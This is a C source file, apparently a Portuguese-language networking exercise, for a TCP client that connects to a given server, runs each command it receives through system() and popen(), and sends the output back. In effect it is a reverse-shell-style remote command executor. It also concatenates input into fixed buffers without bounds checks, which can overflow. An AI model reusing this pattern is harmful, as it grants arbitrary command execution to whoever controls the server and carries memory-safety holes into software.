#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdio.h>
#include <netdb.h>
#include <string.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>


#define MAX_LINE 9999

int GetSocket(int family, int type, int flags);
int ProcessConnection(int s);
void BindConnection(struct sockaddr_in server, int s, char ip[MAX_LINE]);
char ProcessShellCommandOutput(char *cmd, char *buf);


int main(int argc, char *argv[]) {
  struct sockaddr_in server;
  char ip[MAX_LINE];
  char error[MAX_LINE + 1];
  int s;

  /* verificação de argumentos */
  if (argc < 2) {
    strcpy(error,"uso: ");
    strcat(error,argv[0]);
    strcat(error," <Address>");
    perror(error);
    exit(1);
  } else if (argc < 3) {
    strcpy(error,"uso: ");
    strcat(error,argv[0]);
    strcat(error," <Port>");
    perror(error);
    exit(1);
  }

  /* criação de socket ativo*/
  s = GetSocket(AF_INET, SOCK_STREAM, 0);

  server.sin_addr.s_addr = inet_addr(argv[1]);
  server.sin_family = AF_INET;
  server.sin_port = htons((unsigned short)strtol(argv[2],NULL,10));

  BindConnection(server, s, ip);

  /* ler e enviar linhas de texto, receber eco */
  while (1) {
      if (!ProcessConnection(s)) {
        break;
      }
  }

  close(s);
  return 0;
}


int GetSocket(int family, int type, int flags) {
  int s;
  /* criação de socket passivo */
  // Argumentos 1) Internet domain 2) Stream socket 3) Default protocol (TCP)
  s = socket(family, type, flags);
  if (s == -1) {
    printf("Socket nao foi criado");
    exit(1);
  }

  puts("Socket criado");
  return s;
}


void BindConnection(struct sockaddr_in server, int s, char ip[MAX_LINE]) {
  /* estabelecimento da conexão */
  if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0) {
    perror("Falha no estabelecimento da conexao");
    exit(1);
  }

  inet_ntop(AF_INET, &(server.sin_addr), ip, INET_ADDRSTRLEN);
  printf("Conectado em\nIP: %s Porta: %u\n", ip, ntohs(server.sin_port));
}


int ProcessConnection(int s) {
  char buf[MAX_LINE];
  char output[MAX_LINE];

  memset(buf, 0, MAX_LINE);
  memset(output, 0, MAX_LINE);
  //Recebe a resposta do servidor
  if (recv(s, buf, MAX_LINE, 0) < 0) {
    puts("Recebimento falhou");
    return 0;
  }

  if (strcmp(buf, "exitc") == 0 || strcmp(buf, "exits") == 0) {
    return 0;
  }

  if (strlen(buf) == 0 || strcmp(buf, "") == 0) {
    return 1;
  }

  time_t t = time(NULL);
  struct tm tm = *localtime(&t);

  printf("Data e Hora de recebimento: %d-%d-%d %d:%d:%d\n", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);

  int systemResp = system(buf);

  // 32512 é o valor retornado quando a funcão nao roda o metodo desejado
  if (systemResp < 0 || systemResp == 32512) {
    // Erro: comando nao existe
    memset(buf, 0, MAX_LINE);
    memset(output, 0, MAX_LINE);
    strcpy(buf, "Comando inválido");
    return 1;
  }

  ProcessShellCommandOutput(buf, output);

  //Envia a mensagem
  if (send(s, output, strlen(output), 0) < 0) {
    puts("Envio falhou");
    return 0;
  }

  return 1;
}


char ProcessShellCommandOutput(char *cmd, char *buf) {
  char output[1024], start[1024];
  char *s;
  FILE *fpo;
  int size;
  int ret;

  if ((fpo = popen(cmd, "r")) == NULL) {
    sprintf(start, "error");
    size = 6;
  } else {
    sprintf(start, "");
    size = 0;

    while((s =fgets(output, 1024, fpo)) != NULL) {
      strcat(start, output);
      size += (strlen(output)+1);
    }
  }

  strcpy(buf, start);
  ret = pclose(fpo);
  return (ret);
}
